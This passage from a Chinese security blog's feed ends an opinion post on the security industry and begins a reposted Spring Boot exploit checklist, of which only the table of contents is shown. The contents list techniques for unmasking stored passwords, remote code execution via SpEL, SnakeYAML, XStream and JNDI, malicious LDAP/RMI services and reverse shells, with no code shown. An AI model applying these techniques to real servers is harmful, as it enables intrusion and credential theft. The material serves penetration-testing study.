        &lt;ul&gt;
          &lt;li&gt;大部分传统安全厂商选择的是适应市场
            &lt;ul&gt;
              &lt;li&gt;安服需求；夺旗需求；应付工信部门检查等。。。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;爱加密等厂商：
            &lt;ul&gt;
              &lt;li&gt;自己创造需求，创造游戏规则。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;对处于实习期的学生做好职业引导，网络安全行业在未来十年不会成为国家命脉行业，安全行业仅仅作为安全服务的形式为大众所熟知，如今的网络安全行业：&lt;/p&gt;

  &lt;p&gt;国家层面：CTF赛事；护网行动；重大节日保障&lt;/p&gt;

  &lt;p&gt;企业层面：工信局部门检查；等保；自身企业业务安全保障(一般来说，越针对自身企业业务有安全需求的公司，都拥有自己的安全团队)&lt;/p&gt;

  &lt;p&gt;个人层面：个人数据、隐私、财产问题；&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;零当下网络安全行业ctf赛事之我见&quot;&gt;零、当下网络安全行业CTF赛事之我见&lt;/h2&gt;

&lt;!--	oopos！被你发现了！
* it工作人员（包括运维、开发等等）公司内的矛盾

* 软件开发和传统安全公司之间的矛盾

网络防火墙作为访问控制设备，主要工作在OSI模型三、四层，基于IP报文进行检测。只是对端口做限制，对TCP协议做封堵。
其产品设计无需理解HTTP会话，也就决定了无法理解Web应用程序语言如HTML、SQL语言。因此，它不可能对HTTP通讯进行输入验证或攻击规则分析。针对Web网站的恶意攻击绝大部分都将封装为HTTP请求，从80或443端口顺利通过防火墙检测。 
一些定位比较综合、提供丰富功能的防火墙，也具备一定程度的应用层防御能力，如能根据TCP会话异常性及攻击特征阻止网络层的攻击，通过IP分拆和组合也能判断是否有攻击隐藏在多个数据包中，但从根本上说他仍然无法理解HTTP会话，难以应对如SQL注入、跨站脚本、cookie窃取、网页篡改等应用层攻击。 
web应用防火墙能在应用层理解分析HTTP会话，因此能有效的防止各类应用层攻击，同时他向下兼容，具备网络防火墙的功能。 --&gt;

&lt;html&gt;
&lt;head&gt;
	&lt;title&gt;&lt;/title&gt;
&lt;!-- &lt;link href=&quot;/assets/css/bg.css&quot; rel=&quot;stylesheet&quot;&gt; --&gt;
&lt;script&gt;
var consoleConfig = {
welcome: '\n哈？(づ｡◕‿‿◕｡)づ！你在偷看什么。本文还在&quot;思考&quot;中...\n',
theme: '\n1、it工作人员（包括运维、开发等等）公司内的矛盾\n2、软件开发和传统安全公司之间的矛盾  \n\n源码:https://github.com/Bin4xin/bin4xin.github.io \n\n如果喜欢可以 %c star%c  %c支持一下%c  ❤️~\n',

};

var consoleInfo = (function(consoleConfig) {
console.log('%c' + consoleConfig.welcome, 'color: #6190e8');
console.log('%c' + consoleConfig.theme, 'color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;','padding: 0 5px;color: #fff;background: #6190e8;','color: #6190e8;');
console.log('%c' + consoleConfig.qrcode, 'color: #6190e8');
console.log('%c' + consoleConfig.search, 'color: #6190e8');

}(consoleConfig));&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;/body&gt;
&lt;/html&gt;
</description>
        <pubDate>Fri, 25 Sep 2020 00:00:00 +0800</pubDate>
        <link> https://www.sentrylab.cn/blog/2020/think-about-cyber-security/</link>
        <guid isPermaLink="true">/blog/2020/think-about-cyber-security/</guid>
        
        
        <category>blog</category>
        
        <category>笔记</category>
        
      </item>
    
      <item>
        <title>blog: 不得不谈的：「Spring Boot」未授权渗透</title>
        <description>&lt;h4 id=&quot;spring-boot-vulnerability-exploit-checklist&quot;&gt;Spring Boot Vulnerability Exploit CheckList&lt;/h4&gt;

&lt;p&gt;Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list&lt;/p&gt;

&lt;h3 id=&quot;声明&quot;&gt;声明&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit&quot;&gt;这是转载地址&lt;/a&gt;，
&lt;strong&gt;若作者介意请联系：「chihou.pro@gmail.com」删除转载文章&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;目录&quot;&gt;目录&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#spring-boot-vulnerability-exploit-checklist&quot;&gt;Spring Boot Vulnerability Exploit CheckList&lt;/a&gt;
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#%E9%9B%B6%E8%B7%AF%E7%94%B1%E5%92%8C%E7%89%88%E6%9C%AC&quot;&gt;零：路由和版本&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#0x01%E8%B7%AF%E7%94%B1%E7%9F%A5%E8%AF%86&quot;&gt;0x01：路由知识&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x02%E7%89%88%E6%9C%AC%E7%9F%A5%E8%AF%86&quot;&gt;0x02：版本知识&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6%E7%9A%84%E7%89%88%E6%9C%AC%E7%9B%B8%E4%BA%92%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB&quot;&gt;常见组件的版本相互依赖关系：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#spring-cloud-%E4%B8%8E-spring-boot-%E5%A4%A7%E7%89%88%E6%9C%AC%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB&quot;&gt;Spring Cloud 与 Spring Boot 大版本之间的依赖关系：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#spring-cloud-%E5%B0%8F%E7%89%88%E6%9C%AC%E5%8F%B7%E7%9A%84%E5%90%8E%E7%BC%80%E5%8F%8A%E5%90%AB%E4%B9%89&quot;&gt;Spring Cloud 小版本号的后缀及含义:&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2&quot;&gt;一：信息泄露&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F&quot;&gt;0x01：路由地址及接口调用详情泄漏&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x02%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1&quot;&gt;0x02：配置不当而暴露的路由&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80&quot;&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-jolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87&quot;&gt;步骤二： jolokia 调用相关 Mbean 获取明文&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C&quot;&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-1&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7&quot;&gt;步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&quot;&gt;步骤四： 刷新配置&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94-%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC&quot;&gt;步骤五： 解码属性值&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89&quot;&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82-1&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82&quot;&gt;步骤三： 触发对外 http 请求&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1&quot;&gt;步骤四： 刷新配置&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B&quot;&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3&quot;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF&quot;&gt;步骤二： 下载 jvm heap 信息&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E4%BD%BF%E7%94%A8-mat-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87&quot;&gt;步骤三： 使用 MAT 获得 jvm heap 中的密码明文&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#%E4%BA%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&quot;&gt;二：远程代码执行&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#0x01whitelabel-error-page-spel-rce&quot;&gt;0x01：whitelabel error page SpEL RCE&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84&quot;&gt;步骤一：找到一个正常传参处&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%A7%E8%A1%8C-spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F&quot;&gt;步骤二：执行 SpEL 表达式&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x02spring-cloud-snakeyaml-rce&quot;&gt;0x02：spring cloud SnakeYAML RCE&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%98%E7%AE%A1-yml-%E5%92%8C-jar-%E6%96%87%E4%BB%B6&quot;&gt;步骤一： 托管 yml 和 jar 文件&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E8%AE%BE%E7%BD%AE-springcloudbootstraplocation-%E5%B1%9E%E6%80%A7&quot;&gt;步骤二： 设置 spring.cloud.bootstrap.location 属性&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&quot;&gt;步骤三： 刷新配置&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x03eureka-xstream-deserialization-rce&quot;&gt;0x03：eureka xstream deserialization RCE&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8F-xstream-payload-%E7%9A%84%E7%BD%91%E7%AB%99&quot;&gt;步骤一：架设响应恶意 XStream payload 的网站&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3&quot;&gt;步骤二：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7&quot;&gt;步骤三：设置 eureka.client.serviceUrl.defaultZone 属性&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&quot;&gt;步骤四：刷新配置&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x04jolokia-logback-jndi-rce&quot;&gt;0x04：jolokia logback JNDI RCE&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans&quot;&gt;步骤一：查看已存在的 MBeans&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6&quot;&gt;步骤二：托管 xml 文件&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81&quot;&gt;步骤三：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E4%BB%8E%E5%A4%96%E9%83%A8-url-%E5%9C%B0%E5%9D%80%E5%8A%A0%E8%BD%BD%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&quot;&gt;步骤六：从外部 URL 地址加载日志配置文件&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x05jolokia-realm-jndi-rce&quot;&gt;0x05：jolokia Realm JNDI RCE&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans-1&quot;&gt;步骤一：查看已存在的 MBeans&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6&quot;&gt;步骤三：托管 class 文件&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rmi-%E6%9C%8D%E5%8A%A1&quot;&gt;步骤四：架设恶意 rmi 服务&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-1&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-payload&quot;&gt;步骤六：发送恶意 payload&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x06h2-database-query-rce&quot;&gt;0x06：h2 database query RCE&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BE%E7%BD%AE-springdatasourcehikariconnection-test-query-%E5%B1%9E%E6%80%A7&quot;&gt;步骤一：设置 spring.datasource.hikari.connection-test-query 属性&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8&quot;&gt;步骤二：重启应用&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x07h2-database-console-jndi-rce&quot;&gt;0x07：h2 database console JNDI RCE&lt;/a&gt;
            &lt;ul&gt;
